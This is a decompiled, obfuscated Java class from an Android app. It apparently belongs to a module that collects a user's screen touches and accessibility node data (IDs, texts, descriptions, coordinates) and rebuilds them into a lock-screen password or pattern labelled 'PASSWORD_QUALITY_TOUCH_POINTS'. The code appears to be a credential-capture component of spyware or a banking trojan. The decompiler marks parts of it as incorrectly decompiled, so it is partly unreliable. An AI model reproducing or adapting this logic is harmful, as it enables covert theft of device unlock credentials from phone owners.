package com.storm.safe.rock.service.modules.cipher;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import p000.AbstractC0715je;
import p000.AbstractC0717jg;
import p000.AbstractC0720jj;
import p000.C1214s9;
import p000.h10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class CipherDataHolder implements Serializable {

    /* renamed from: a0 */
    public ListenHelper f53225a0;

    /* renamed from: a1 */
    public final LinkedList f53226a1 = new LinkedList();

    /* renamed from: a2 */
    public final LinkedList f53227a2 = new LinkedList();

    /* JADX WARN: Removed duplicated region for block: B:91:0x019b  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211772a0(h10 h10Var, h10 h10Var2, h10 h10Var3, h10 h10Var4) {
        LinkedList linkedList;
        LinkedList linkedList2;
        CipherResult cipherResult;
        String str;
        String str2;
        String str3;
        t60.m214695b6(h10Var, "extractByIdFunc");
        t60.m214695b6(h10Var2, "extractByTextFunc");
        t60.m214695b6(h10Var3, "validateFunc");
        ListenHelper listenHelper = this.f53225a0;
        if (listenHelper == null) {
            return;
        }
        synchronized (this) {
            linkedList = new LinkedList(this.f53227a2);
            linkedList2 = new LinkedList(this.f53226a1);
        }
        if (linkedList2.isEmpty() && linkedList.isEmpty()) {
            return;
        }
        if (linkedList2.isEmpty() && !linkedList.isEmpty()) {
            if (linkedList.size() < 4) {
                linkedList.size();
                return;
            }
            linkedList.size();
            CipherResult cipherResult2 = new CipherResult();
            cipherResult2.f53234a1 = new ArrayList(linkedList);
            cipherResult2.f53235a2 = "PASSWORD_QUALITY_TOUCH_POINTS";
            ((TouchViewManager$handleTeardownData$5) h10Var4).invoke(cipherResult2);
            return;
        }
        Integer num = listenHelper.f53239a0;
        if (num != null && num.intValue() == 1 && !linkedList.isEmpty()) {
            if (linkedList.size() < 6) {
                linkedList.size();
                return;
            }
            CipherResult cipherResult3 = new CipherResult();
            cipherResult3.f53234a1 = new ArrayList(linkedList);
            cipherResult3.f53235a2 = "PASSWORD_QUALITY_TOUCH_POINTS";
            ((TouchViewManager$handleTeardownData$5) h10Var4).invoke(cipherResult3);
        }
        if (linkedList2.isEmpty()) {
            return;
        }
        LinkedList linkedList3 = new LinkedList();
        LinkedList linkedList4 = new LinkedList();
        LinkedList linkedList5 = new LinkedList();
        LinkedList linkedList6 = new LinkedList();
        Iterator it = linkedList2.iterator();
        while (it.hasNext()) {
            ListenPropResponse listenPropResponse = (ListenPropResponse) it.next();
            String str4 = listenPropResponse.f53241a1;
            if (str4 != null) {
                int iHashCode = str4.hashCode();
                if (iHashCode != -1446386859) {
                    if (iHashCode != 3355) {
                        if (iHashCode != 3079825) {
                            if (iHashCode == 3556653 && str4.equals("text")) {
                                linkedList4.add(listenPropResponse);
                            }
                        } else if (str4.equals("desc")) {
                            linkedList5.add(listenPropResponse);
                        }
                    } else if (str4.equals("id")) {
                        linkedList3.add(listenPropResponse);
                    }
                } else if (str4.equals("adb_coord")) {
                    linkedList6.add(listenPropResponse);
                }
            }
        }
        if (!linkedList6.isEmpty()) {
            linkedList6.size();
            if (linkedList6.size() < 6) {
                linkedList6.size();
                return;
            }
            CipherResult cipherResult4 = new CipherResult();
            cipherResult4.f53234a1 = new ArrayList(linkedList);
            cipherResult4.f53235a2 = "PASSWORD_QUALITY_TOUCH_POINTS";
            ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(linkedList6));
            Iterator it2 = linkedList6.iterator();
            while (it2.hasNext()) {
                arrayList.add(((ListenPropResponse) it2.next()).f53242a2);
            }
            cipherResult4.f53233a0 = AbstractC0715je.m213295i2(arrayList, "|", null, null, null, 62);
            ((TouchViewManager$handleTeardownData$5) h10Var4).invoke(cipherResult4);
            return;
        }
        if (linkedList3.isEmpty()) {
            cipherResult = null;
        } else {
            if (linkedList3.size() > 1) {
                AbstractC0720jj.m213313h1(linkedList3, new C1214s9(2));
            }
            cipherResult = (CipherResult) h10Var.invoke(linkedList3);
            if (cipherResult == null || (str3 = cipherResult.f53233a0) == null || str3.length() == 0) {
            }
        }
        if (!linkedList4.isEmpty()) {
            if (linkedList4.size() > 1) {
                AbstractC0720jj.m213313h1(linkedList4, new C1214s9(3));
            }
            CipherResult cipherResult5 = (CipherResult) h10Var2.invoke(linkedList4);
            if (cipherResult5 != null && (str2 = cipherResult5.f53233a0) != null && str2.length() != 0) {
                if (cipherResult == null) {
                    cipherResult = cipherResult5;
                } else {
                    String str5 = cipherResult.f53233a0;
                    if (str5 == null || str5.length() == 0) {
                        cipherResult.f53233a0 = cipherResult5.f53233a0;
                    }
                }
            }
        }
        if (!linkedList5.isEmpty()) {
            if (linkedList5.size() > 1) {
                AbstractC0720jj.m213313h1(linkedList5, new C1214s9(4));
            }
            CipherResult cipherResult6 = (CipherResult) h10Var.invoke(linkedList5);
            if (cipherResult6 != null && (str = cipherResult6.f53233a0) != null && str.length() != 0) {
                if (cipherResult == null) {
                    cipherResult = cipherResult6;
                } else {
                    String str6 = cipherResult.f53233a0;
                    if (str6 == null || str6.length() == 0) {
                        cipherResult.f53233a0 = cipherResult6.f53233a0;
                    }
                }
            }
        }
        if (cipherResult == null || !((Boolean) h10Var3.invoke(cipherResult.f53233a0)).booleanValue()) {
            return;
        }
        if (!linkedList.isEmpty()) {
            cipherResult.f53234a1 = new ArrayList(linkedList);
        }
        cipherResult.toString();
        ((TouchViewManager$handleTeardownData$5) h10Var4).invoke(cipherResult);
    }
}
